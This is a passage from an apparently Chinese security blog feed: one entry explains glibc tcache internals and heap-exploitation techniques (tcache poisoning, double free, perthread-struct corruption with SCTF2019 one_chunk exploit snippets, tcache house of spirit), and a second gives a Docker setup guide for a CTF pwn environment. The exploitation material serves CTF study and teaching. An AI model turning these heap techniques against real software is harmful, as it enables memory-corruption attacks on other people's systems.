<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出<code>tcache_put</code>会检测idx是不是在<code>tcache</code>的范围中，然后就没别检测了，也就是说我随便free一个chunk，不管之前是什么东西，都会直接添加到对应大小的<code>tcache</code>中。所以说可以连续<code>free</code>直接造成<code>double free</code>,太不安全了。。。。</p>
<p><code>tcache_get</code>会检测<code>idx</code>在不在范围内，并且相应大小的<code>tcache</code>链中是否有空闲chunk，也并没有像fastbin中检测这个空闲<code>chunk</code>的<code>size</code>和下一块<code>chunk</code>的<code>prev_size</code>是不是一样。这伪造<code>fake chunk</code>就很简单呀。。。。</p>
<p>这两个函数会在函数 <em>int_free 和 __libc_malloc 的开头被调用，其中 tcache_put 当所请求的分配大小不大于0x408并且当给定大小的 tcache bin 未满时调用。一个 tcache bin 中的最大块数mp</em>.tcache_count是7。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>free时，如果size &lt; smallbin size:</p>
<ol>
<li>会被放到对应size的tcache中，每个tcache默认最多储存7个.</li>
<li>tcache存满之后，free便会存到fastbin或者unsortedbin.</li>
<li>被放入tcache的chunk不会取消其nextchunk的inuse bit，不会被合并。</li>
</ol>
<p>malloc时，且size在tcache范围内。</p>
<ol>
<li>先从tcache中取chunk，遵循FILO原则。直到对应size的tcache为空后才会从bin中找。</li>
<li>tcache为空时，如果fastbin/smallbin/unsorted bin中有符合size的chunk，会先把它们放到tcache中，直到tcache满，然后再从tcache中取。因此chunk在bin中和tcache中的顺序相反。</li>
</ol>
<h2 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h2><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"</span></span><br><span class="line">	       <span class="string">"returning a pointer to an arbitrary location (in this case, the stack).\n"</span></span><br><span class="line">	       <span class="string">"The attack is very similar to fastbin corruption attack.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> stack_var;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The address we want malloc() to return is %p.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 1 buffer.\n"</span>);</span><br><span class="line">	<span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the buffer...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the tcache list has [ %p ].\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"</span></span><br><span class="line">		<span class="string">"to point to the location to control (%p).\n"</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), a, &amp;stack_var);</span><br><span class="line">	a[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the tcache list has [ %p ].\n"</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(128): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We got the control\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>类似 fastbin dup，不过利用的是 tcache_put() 的不严谨</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，tcache_put() 的检查也可以忽略不计（甚至没有对 tcache-&gt;counts[tc_idx] 的检查），大幅提高性能的同时安全性也下降了很多。<br>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with tcache.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating buffer.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing twice...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p ].\n"</span>, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Next allocated buffers will be same: [ %p, %p ].\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如此直白明显的<code>double free</code>都不会引起crash，效率是增加了，但这真的安全性堪忧，只能依靠程序员的安全意识了，不过听说新版本的commit把这个安全性进行了加强。</p>
<h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>我们已经知道 tcache_perthread_struct 是整个 tcache 的管理结构，如果能控制这个结构体，那么无论我们 malloc 的 size 是多少，地址都是可控的。</p>
<p>因为 tcache_prethread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</p>
<h4 id="SCTF2019-one-chunk"><a href="#SCTF2019-one-chunk" class="headerlink" title="SCTF2019 one_chunk"></a>SCTF2019 one_chunk</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">New(<span class="number">0x68</span>, <span class="string">'\n'</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(len(sys.argv) &gt; <span class="number">1</span>):</span><br><span class="line">    value = hook1 + <span class="number">0x10</span></span><br><span class="line">    New(<span class="number">0x68</span>, p64(value)[:<span class="number">2</span>] + <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    New(<span class="number">0x68</span>, <span class="string">'\x10\x10'</span> + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">New(<span class="number">0x68</span>, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<p>调试结果如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x70</span> [  <span class="number">0</span>]: <span class="number">0x557c58293010</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x557c58293000</span> PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">593</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后 <code>free</code>掉 <code>tcache_perthread_struct</code>，使其放入<code>usorted bin</code>，然后<code>tcache</code>上就会因为<code>usorted bin</code>的 分配而被写上<code>main_arena</code>的地址，在对<code>main_arena</code>的地址进行部分覆盖，实现控制<code>_IO_2_1_stdout_</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">New(<span class="number">0x68</span>, <span class="string">'\xFF'</span> * <span class="number">0x40</span> + <span class="string">'\n'</span>)  <span class="comment">#这里就是把count弄满，使得下次free到unsortedbin</span></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">New(<span class="number">0x48</span>, <span class="string">'\xFF'</span> * <span class="number">0x40</span> + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(len(sys.argv) &gt; <span class="number">1</span>):</span><br><span class="line">    value = hook2 + libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    print(hex(value))</span><br><span class="line"></span><br><span class="line">    New(<span class="number">0x18</span>, p64(value)[:<span class="number">2</span>] + <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    New(<span class="number">0x18</span>, <span class="string">'\x60\x67'</span> + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h3><p>拿 how2heap 的源码来讲：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack on tcache.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Ok. Let's start with the example!.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region contains one fake chunk. It's size field is placed at %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line"></span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击之后的目的是，去控制栈上的内容，malloc 一块 chunk ，然后我们通过在栈上 fake 的 chunk，然后去 free 掉他，我们会发现Tcache 里就存放了一块 栈上的内容，我们之后只需 malloc，就可以控制这块内存。</p>
<h3 id="tcache的counts中存在的数据类型判断漏洞"><a href="#tcache的counts中存在的数据类型判断漏洞" class="headerlink" title="tcache的counts中存在的数据类型判断漏洞"></a>tcache的counts中存在的数据类型判断漏洞</h3><p>counts定义为一个字符数组，记录每个tcache链中tcache的数量，在C语言中并没有char类型的常量（但是在C++中却有，字符常量都是char类型），其实是用int表示char，所以这个counts是一个有符号整型变量(-128~127)</p>
<p>在int_free函数中，把chunk放入tcache时，会判断待放入的tcache链是否小于mp_.tcache_count，一般为7</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_put (p, tc_idx);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>查看源码，tcache_count是一个size_t类型的变量，也就是无符号长整型，那么上述的判断就变为 char型的counts 是否小于unsigned long int型的tcache_count ，就会把counts变量转为无符号的长整型进行比较</p>
<p>如果此时的counts大小为-1(0xff)，被转成无符号的长整型后就变成255(0xff)，那么就会使上述判断失效，在tcache的counts变成-1后，就会将之后free的chunk，放入unsortedbin中</p>
<p>有什么用呢？</p>
<p>当我们double free一个chunk后，tcache会的得到一个自循环的链表，tcache的counts是2</p>
<p>连续申请两次后，counts会变成0</p>
<p>再申请一次后，发现其counts变成了0xff，此时再次free该chunk，chunk就会进入unsortedbin中</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>堆</tag>
        <tag>tcache</tag>
      </tags>
  </entry>
  <entry>
    <title>docker 初探</title>
    <url>/year/01/30/cl7iordpb0024293fhfd5zi74/</url>
    <content><![CDATA[<h2 id="0x0-Docker是什么"><a href="#0x0-Docker是什么" class="headerlink" title="0x0 Docker是什么"></a>0x0 Docker是什么</h2><p>Docker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。</p>
<a id="more"></a>

<p>Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker，就不用担心环境问题。</p>
<p>总体来说，Docker 的接口相当简单，用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。</p>
<p>也体验一下docker，这里有别人已经搭好的 <a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a><br>这里也自己搭下，体验下流程<br><a href="https://docs.docker.com/config/daemon/systemd/" target="_blank" rel="noopener">docker官方文档</a></p>
<h3 id="复用别人的image，真爽"><a href="#复用别人的image，真爽" class="headerlink" title="复用别人的image，真爽"></a>复用别人的image，真爽</h3><p>下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure>

<p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d  --rm -h breeze --name redhat -v /mnt/hgfs/share:/ctf/work -p 23946:23946 --cap-add=SYS_PTRACE skysider/pwndocker</span><br></pre></td></tr></table></figure>

<ul>
<li>-d：后台运行</li>
<li>–rm：停止后自动删除</li>
<li>-h：主机名breeze</li>
<li>–name：docker名字breeze</li>
<li>-v：将kali的/mnt/hgfs/share挂在再docker中的/ctf/work目录（share也是kali和物理机的共享目录，三机共享）</li>
<li>-p：端口映射（没啥用，这时已经不用ida远程调试了，有些题目带端口的可以用）</li>
<li>–cap-add：增加一个参数，否则调试会出问题</li>
</ul>
<p>然后就可以获取id，以后每次都用shell脚本开启就行</p>
<h3 id="调试时"><a href="#调试时" class="headerlink" title="调试时"></a>调试时</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process([<span class="string">"/path/to/ld.so"</span>, <span class="string">"./test"</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/path/to/libc.so.6"</span>&#125;)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br></pre></td></tr></table></figure>

<ul>
<li>第二行指定ld.so和libc</li>
<li>第三行要在tmux下运行才能出调试的那个终端</li>
</ul>
<h2 id="0x01-下载并启动ubuntu镜像"><a href="#0x01-下载并启动ubuntu镜像" class="headerlink" title="0x01 下载并启动ubuntu镜像"></a>0x01 下载并启动ubuntu镜像</h2><p>Docker 把应用程序及其依赖，打包在 image 文件里面。只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。</p>
<p>image 是二进制文件。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。举例来说，你可以在 Ubuntu 的 image 基础上，往里面加入 Apache 服务器，形成你的 image。</p>
<p>这里我们从官网的仓库中拉取一个ubuntu 18.04的image然后自己创建一个pwn环境的image</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> docker pull ubuntu:18.04</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<p>接下来启动ubuntu镜像；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker run -i -t --name create_env ubuntu:18.04 bash</span><br><span class="line">root@5cfd7de2e9f7:/<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>-t 和 -i 这两个参数是必须的，代表的是可交互的。</p>
<h2 id="0x02-安装环境"><a href="#0x02-安装环境" class="headerlink" title="0x02 安装环境"></a>0x02 安装环境</h2><h3 id="修改源"><a href="#修改源" class="headerlink" title="修改源"></a>修改源</h3><p>和正常的ubuntu一样，首先修改系统的源，这里使用的是清华的源：<br><a href="https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener">https://mirror.tuna.tsinghua.edu.cn/help/ubuntu/</a><br>依次执行下面的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/apt</span><br><span class="line"><span class="comment"># 保存原始的sources.list文件</span></span><br><span class="line">cp sources.list sources.list.bak</span><br><span class="line">apt-get update</span><br><span class="line"><span class="comment"># 安装编辑文本的工具，可以用自己顺手的vim</span></span><br><span class="line">apt-get install nano</span><br><span class="line"><span class="comment"># 更换源之后采用https协议，需要安装该软件才行</span></span><br><span class="line">apt-get install apt-transport-https</span><br><span class="line"><span class="comment"># 覆盖原始的内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">''</span> &gt; sources.list</span><br><span class="line"><span class="comment"># 将清华的源拷贝进去(Ctrl+Shift+v)保存</span></span><br><span class="line">nano sources.list</span><br><span class="line"></span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<p><a href="https://www.caorui.net/blog/42.html" target="_blank" rel="noopener">使用国内镜像遇到的问题和解决办法</a></p>
<h3 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h3><p>依次执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line"></span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>

<h3 id="安装32位库"><a href="#安装32位库" class="headerlink" title="安装32位库"></a>安装32位库</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install  lib32ncurses5 lib32z1</span><br></pre></td></tr></table></figure>

<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p><a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">pwngdb</a><br><a href="https://blog.csdn.net/u012552275/article/details/61654857" target="_blank" rel="noopener">解决无法ping通github</a><br><a href="http://p4nda.top/2018/03/03/question/" target="_blank" rel="noopener">ROPGadget等工具</a></p>
<h3 id="安装tmux"><a href="#安装tmux" class="headerlink" title="安装tmux"></a>安装tmux</h3><p>使用bash进入到docker中后只有一个命令行终端，这样很不方便，可以在该容器中安装tmux，来同时开启多个终端。<br>使用<br>apt-get install tmux来安装<br>启动鼠标切换界面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@5cfd7de2e9f7:~# touch .tmux.conf</span><br><span class="line">root@5cfd7de2e9f7:~# nano .tmux.conf </span><br><span class="line">root@5cfd7de2e9f7:~#</span><br></pre></td></tr></table></figure>

<p><em>注意：在启用鼠标切换之后如果需要选中终端中的部分内容，需要在按住Shift的情况下才可以</em></p>
<h3 id="tmux快捷键"><a href="#tmux快捷键" class="headerlink" title="tmux快捷键"></a>tmux快捷键</h3><p><code>ctrl b + l</code></p>
<p><code>ctrl b + n</code></p>
<p>分别是切换到last页和next页</p>
<p><code>ctrl b + [</code></p>
<p>可以使用光标滚屏 q 退出</p>
<p><code>ctrl b + 方向键</code></p>
<p>切换split分隔的终端</p>
<h2 id="0x03-将容器打包成自己的镜像"><a href="#0x03-将容器打包成自己的镜像" class="headerlink" title="0x03 将容器打包成自己的镜像"></a>0x03 将容器打包成自己的镜像</h2><p>经过上面的步骤，我们已经搭建好了需要的环境，下面就将这个容器打包成镜像：</p>
<ol>
<li>首先退出该容器，然后查看已经停止运行的容器：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ docker ps -a</span><br><span class="line">CONTAINER ID        IMAGE                COMMAND             CREATED             STATUS                      PORTS               NAMES</span><br><span class="line">5cfd7de2e9f7        ubuntu:16.04         <span class="string">"bash"</span>              About an hour ago   Exited (0) 13 seconds ago                       create_env</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>得到容器的id为：5cfd7de2e9f7</p>
<ol start="2">
<li><p>使用commit命令提交该容器为镜像：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可能需要一点时间</span></span><br><span class="line">$ docker commit -m <span class="string">"pwn 16.04 v2"</span> 5cfd7de2e9f7 e3pem/dockerpwn:v2 </span><br><span class="line">sha256:68136e03da7b3d544fd8ece63b6fbdcbd962948e9bcdc1a390d529cb89193ea9</span><br><span class="line"><span class="comment"># 其中`-m`为提交镜像时的描述</span></span><br><span class="line"><span class="comment"># 5cfd7de2e9f7 为容器的id</span></span><br><span class="line"><span class="comment"># e3pem/dockerpwn:v2 为镜像的标签，将e3pem换成自己在dockerhub上的用户名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看构造出来的镜像</span></span><br><span class="line">$ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">e3pem/dockerpwn     v2                  68136e03da7b        2 minutes ago       956MB</span><br><span class="line">e3pem/dockerpwn     v1                  fa2334fe2cd8        20 hours ago        1.24GB</span><br><span class="line">dockerpwn           v1                  fa2334fe2cd8        20 hours ago        1.24GB</span><br><span class="line">ubuntu              16.04               b9e15a5d1e1a        3 weeks ago         115MB</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以选择将镜像push到dockerhub：</p>
</li>
<li><p><a href="https://help.aliyun.com/document_detail/51810.html" target="_blank" rel="noopener">上传到阿里云</a></p>
</li>
</ol>
<h2 id="0x04-使用构建的镜像"><a href="#0x04-使用构建的镜像" class="headerlink" title="0x04 使用构建的镜像"></a>0x04 使用构建的镜像</h2><p>在分析题目的时候经常需要进行调试，在docker中调试是需要权限的，因此在第一次启动镜像的时候需要添加–privileged选项</p>
<p>同时可以将容器中的某一个目录和主机的目录建立映射，这样就能很方便的在宿主机和容器间共享文件了，使用-v选项来设置共享目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -i -t --privileged -v /home/yourhost/path/ctf:/home/docker/path/ctf e3pem/dockerpwn:v2 bash</span><br></pre></td></tr></table></figure>

